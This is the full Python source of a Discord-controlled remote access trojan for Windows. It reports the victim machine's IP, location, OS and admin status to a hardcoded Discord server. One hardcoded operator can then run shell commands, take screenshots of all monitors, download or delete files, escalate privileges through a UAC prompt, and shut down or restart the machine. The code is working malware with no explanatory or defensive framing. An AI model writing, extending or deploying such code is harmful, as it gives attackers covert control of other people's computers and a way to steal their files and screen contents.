import truststore
truststore.inject_into_ssl()

import discord
import os
import sys
import platform
import ctypes
import urllib.request
import json
import mss
import pyautogui as pag
import shutil
import asyncio
import pyuac
import subprocess

token = ''
intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    url = urllib.request.urlopen('https://geolocation-db.com/json')
    info = json.loads(url.read().decode())
    flag = info['country_code']
    ip = info['IPv4']

    plat = platform.uname()
    global channelname
    channelname = f'session-{plat.node.lower()}'
    cmdguild = client.get_guild(1231254331794391060)
    await cmdguild.create_text_channel(channelname)
    channel = discord.utils.get(cmdguild.text_channels, name=channelname)
    global activechannel
    activechannel = client.get_channel(channel.id)
    hello = f'Bot has been started on {plat.system} {plat.release}. Location is :flag_{flag.lower()}:. IP is {ip}.'

    isadmin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if isadmin == True:
        await activechannel.send(f'{hello} Has admin.')
    elif isadmin == False:
        await activechannel.send(hello)

@client.event
async def on_message(message):
    if message.author == client.user:
        pass
    if message.author.id == 250684163303276545:
        if message.channel.name != channelname:
            pass
        else:
            match message.content:
                case '!quit':
                    await activechannel.delete()
                    sys.exit(0)

                case '!uac':
                    try:
                        if not pyuac.isUserAdmin():
                            await message.channel.send('Restarting as admin')
                            pyuac.runAsAdmin()
                        else:
                            await message.channel.send('Program has admin')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                case '!help':
                    await message.channel.send('Commands available:'
                                               '!help - Brings up this message'
                                               '!uac - Attempts to gain admin by prompting the user'
                                               '!cwd - Displays the current working directory'
                                               '!lsfiles - Lists all files in current directory'
                                               '!lsdir - Lists all directories in current directory'
                                               '!screenshot - Takes a screenshot of all available monitors'
                                               '!restart - Restarts the computer'
                                               '!shutdown - Shuts down the computer'
                                               '!cd - Moves to a different directory - !cd /path/to/directory'
                                               '!cp - Copies a file to another directory - !cp /path/to/file and wait for bot ask for destination'
                                               '!delete - Deletes a file - !delete /path/to/file'
                                               '!download - Downloads a file - !download /path/to/file'
                                               '!alert - Pops up an alert on screen - !alert text'
                                               '!prompt - Pops up a prompt on screen - !prompt text'
                                               '!shell - Runs a shell command - !shell command')

                case '!cwd':
                    await message.channel.send(f'Current directory: {os.getcwd()}')

                case '!lsfiles':
                    files = []
                    dir = os.scandir(os.getcwd())
                    await message.channel.send(f'Files in: {os.getcwd()}')
                    for item in dir:
                        if item.is_file():
                            files.append(item.name)
                    await message.channel.send('\n'.join(files))

                case '!lsdir':
                    folders = []
                    dir = os.scandir(os.getcwd())
                    await message.channel.send(f'Folders in: {os.getcwd()}')
                    for item in dir:
                        if item.is_dir():
                            folders.append(item.name)
                    await message.channel.send('\n'.join(folders))

                case '!screenshot':
                    with mss.mss() as sc:
                        ss = sc.shot(mon=-1, output='monitors.png')
                    file = discord.File(ss, filename='monitors.png')
                    await message.channel.send(f'Here is the screenshot:', file=file)
                    os.remove('monitors.png')

                case '!restart':
                    await message.channel.send('Restarting computer')
                    await activechannel.delete()
                    os.system('shutdown /r /t 00')

                case '!shutdown':
                    await message.channel.send('Shutting down computer')
                    await activechannel.delete()
                    os.system('shutdown /s /t 00')

                case cmd if cmd.startswith('!cd'):
                        arg = message.content.split(' ', 1)
                        try:
                            if len(arg) == 2:
                                os.chdir(str(arg[1]))
                                await message.channel.send(f'Moved to {os.getcwd()}')
                            else:
                                await message.channel.send('No argument given')
                        except Exception as e:
                            await message.channel.send(f'An error occurred: {e}')

                case cmd if cmd.startswith('!cp'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            input1 = arg[1]
                            await message.channel.send(f'Provide the destination folder and the copy filename')
                            try:
                                arg2 = await client.wait_for('message', timeout=20, check= lambda m: m.author == message.author and m.channel == message.channel)
                                input2 = arg2.content
                                await message.channel.send(f'Copying {input1} to {input2}')
                                shutil.copy(input1, input2)
                            except asyncio.TimeoutError:
                                await message.channel.send('Command timed out, try again.')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                case cmd if cmd.startswith('!delete'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            os.remove(arg[1])
                            await message.channel.send(f'File deleted')
                        else:
                            await message.channel.send('No argument given')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                case cmd if cmd.startswith('!download'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            file = discord.File(arg[1], filename=message.content[len('!download '):])
                            await message.channel.send('Here is the file:', file=file)
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                case cmd if cmd.startswith('!alert'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            await message.channel.send('Alert box created')
                            pag.alert(text=arg[1], title='', timeout=10000)
                            await message.channel.send('Alert box closed')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                case cmd if cmd.startswith('!prompt'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            await message.channel.send('Prompt box created')
                            reply = pag.prompt(text=arg[1], title='')
                            await message.channel.send(f'User responded with: {reply}')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                case cmd if cmd.startswith('!shell'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            await message.channel.send('Command is being executed')
                            output = subprocess.run(arg[1], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                            await message.channel.send(output.stdout.decode('cp437'))
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

    else:
        pass

client.run(token)